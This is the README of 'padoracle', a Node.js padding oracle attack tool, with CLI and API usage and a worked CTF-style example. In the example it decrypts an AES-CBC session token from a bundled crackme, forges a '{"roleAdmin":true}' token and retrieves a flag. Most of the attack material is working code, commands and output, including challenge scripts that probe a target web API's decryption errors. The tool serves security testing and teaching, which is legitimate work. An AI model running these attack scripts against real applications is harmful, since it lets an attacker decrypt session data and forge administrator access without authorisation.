# padoracle
> Padding Oracle Attack with Node.js

## Features
- :video_game: Friendly CLI
- :electric_plug: Powerful API
- :unlock: **Crack** plaintext, with just one set of known iv (initialization-vector) and ciphertext
- :lock_with_ink_pen: Generate iv and ciphertext with any **modified** plaintext you want
- :floppy_disk: Programamble challenge script
- :dancers: Ultra-fast cracking, with unlimited concurrency

## CLI
### Installation
```bash
npm i -g padoracle
```

### Usage
#### Crack-Mode
Crack plaintext with a set of known iv and ciphertext:

```bash
padoracle <challenge-script> --size 16 --iv-cipher <iv-cipher>
```

#### Modify-Mode
Generate a set of iv and ciphertext with specific plaintext:
```bash
padoracle <challenge-script> --size 16 --plain <plain>
```

### Options
#### Common Options
- `challenge-script`
    
    A script which sends the decryption challenge to the target system.

- `--size, -s`

    Size of each block (in bytes).

- `--help, -h`
    
    Show the help text.


#### Crack-Mode Options
- `--iv-cipher`

    An iv-cipher pair which can pass the padding check (with base64 encoded).

- `--concurrency, -c`

    Concurrency, Infinity by default.


#### Modify-Mode Options
- `--plain, -p`

    Target plain text.


### Challenge Script
When using Padoracle, you always need a challenge-script, which is a straightforward [ESM](https://github.com/standard-things/esm) script.

The challenge-script has to expose a default member, which is a function that accepts a set of iv and ciphertext, also returns `false` if decryption fails, otherwise `true`.

For example, in the most common scenario of attacking web applications, we can write a script like this:

```javascript
const got = require('got') // You need to install dependencies manually.

const API = `http://somewebsite/someapi` // The API that invokes decryption.

const DECRYPTION_ERROR = 'DECRYPTION FAILED' // The message returns by the webapp when decrypting failed.

const challenge = async (iv, cipher) => {
  let response = await got.post(API, {
    body: Buffer.concat([iv, cipher]).toString('base64'),
  }).catch((error) => error.response)
  if (response.body === DECRYPTION_ERROR) {
    return false
  }
  return true
}

export default challenge
```

See more complete scripts in [the examples](./examples).


### Examples
Suppose there is a program to be attacked, which we call [the Crackme](./examples/0.node/crackme/index.js).  

The Crackme provides two API —— `welcome()` to get a default token and `auth(token)` to verify administrator privileges.

Tokens are values encoded in Base64 after concatenating iv and ciphertext. 
By decrypting this ciphertext with **AES-256-CBC** algorithm and this iv, the Crackme will get a JSON serialized session, which also means that the size of each block in the plaintext, iv, and ciphertext is all **16** (256/16) bytes.

When we have administrator privileges, `auth(token)` API will return a secrect data (`{FLAG}`) to us. Otherwise, that will return nothing. 

Also, if there is an exception while decrypting token, the Crackme will throw an error, which is just the characteristic of the Padding Oracle vulnerability.

**Our ultimate goal here is to get this secrect data (`{FLAG}`).**

For example, with the `welcome()` API here, we always get the same token value `'UGFkT3JhY2xlOml2L2NiYyiFmLTj7lhu4mAJHakEqcIIoYU0lIUXKx+PmTaUHLV0'`,
which is concatenated by iv (`<Buffer 50 61 64 4f 72 61 63 6c 65 3a 69 76 2f 63 62 63>`) and cipher (`<Buffer 28 85 98 b4 e3 ee 58 6e e2 60 09 1d a9 04 a9 c2 08 a1 85 34 94 85 17 2b 1f 8f 99 36 94 1c b5 74>`) after base64 decoded.

According to the protocol, we write a [challenge-script](./examples/0.node/challenge.js) accepts a set of iv and ciphertext, which returns `false` when decrypting failed, otherwise, return `true` no matter the final session is valid or not.

```javascript
const crackme = require('./crackme')

const challenge = async (iv, cipher) => {
  try {
    await crackme.api.auth(Buffer.concat([iv, cipher]).toString('base64'))
  } catch (error) {
    return false
  }
  return true
}

export default challenge
```

Easy, huh?

Then we use our CLI tools to crack the plaintext that this iv-ciphertext encrypted. 

```bash
padoracle ./examples/0.node/challenge.js --iv-cipher UGFkT3JhY2xlOml2L2NiYyiFmLTj7lhu4mAJHakEqcIIoYU0lIUXKx+PmTaUHLV0 --size 16
```

In a few minutes later, we will get the result:

```
----- Block 0 -----
Intermediary (0) : 2b|43|0d|2b|50|5b|52|5c|55|16|4b|04|40|0f|07|22
--------------------
----- Block 1 -----
Intermediary (1) : 4c|e8|f1|da|c1|d4|3e|0f|8e|13|6c|60|ad|00|ad|c6
--------------------
--------------------
Plain text: {"id":100,"roleAdmin":false}
Plain text (hex): 7b226964223a3130302c22726f6c6541646d696e223a66616c73657d04040404
```

Now we know that the default session is `{"id":100,"roleAdmin":false}`.

Based on the structure of this session, we can determine that the next goal is to set the value of `roleAdmin` to `true`, such as `{"roleAdmin":true}`.

So, let's do it:

```bash
padoracle ./examples/0.node/challenge.js --size 16 --plain "{\"roleAdmin\":true}"
```

In a few minutes later again, we will get the result:

```
IV (hex): ff291b394b7c56f3f964d3cf2fad0dbb
Cipher (hex): ecacc85b787f9777864b39fff50d5314ffffffffffffffffffffffffffffffff
IV-Cipher (base64): /ykbOUt8VvP5ZNPPL60Nu+ysyFt4f5d3hks5//UNUxT/////////////////////
```

Let's verify the results. Create a [`flag.js`](./examples/0.node/flag.js):

```javascript
const crackme = require('./crackme')

const TOKEN = '/ykbOUt8VvP5ZNPPL60Nu+ysyFt4f5d3hks5//UNUxT/////////////////////'

;(async () => {
  let result = await crackme.api.auth(TOKEN)
  console.log(result)
})()
```

Run it:

```bash
node ./examples/0.node/flag.js
# {FLAG}
```

We did it! ：wink:

## API
### Installation
```bash
npm i --save padoracle
```

### Usage
Crack plaintext with a set of known iv and ciphertext:

```javascript
const Cracker = require('padoracle')
const pkcs7 = require('pkcs7')
const got = require('got')

const API = `http://somewebsite/someapi` // The API that invokes decryption.
const DECRYPTION_ERROR = 'DECRYPTION FAILED' // The message returns by the webapp when decrypting failed.

const challenge = async (iv, cipher) => {
  let response = await got.post(API, {
    body: Buffer.concat([iv, cipher]).toString('base64'),
  }).catch((error) => error.response)
  if (response.body === DECRYPTION_ERROR) {
    return false
  }
  return true
}

const iv = Buffer.from('5061644f7261636c653a69762f636263', 'hex')
const cipher = Buffer.from('288598b4e3ee586ee260091da904a9c208a185349485172b1f8f9936941cb574', 'hex')

let result, plain

let cracker = new Cracker()
result = await cracker.crack(iv, cipher, challenge)
plain = pkcs7.unpad(result.plain).toString()

console.log(plain)
```


Generate a set of iv and ciphertext with specific plaintext:

```javascript
const Cracker = require('padoracle')
const got = require('got')

const API = `http://somewebsite/someapi` // The API that invokes decryption.
const DECRYPTION_ERROR = 'DECRYPTION FAILED' // The message returns by the webapp when decrypting failed.

const challenge = async (iv, cipher) => {
  let response = await got.post(API, {
    body: Buffer.concat([iv, cipher]).toString('base64'),
  }).catch((error) => error.response)
  if (response.body === DECRYPTION_ERROR) {
    return false
  }
  return true
}

const target = '{"roleAdmin":true}'
const size = 16

let cracker = new Cracker()
let { iv, cipher } = await cracker.modify(target, size, challenge)
console.log(iv, cipher)
```

See more examples in [tests](./test) .

### Cracker
- Cracker#crack(iv, cipher, challenge)
  - return `{ intermediary, plain }`
- Cracker#modify(target, size, challenge)
  - return `{ iv, cipher }`

## License
[Apache-2.0](./license) &copy; [yelo](https://github.com/imyelo)
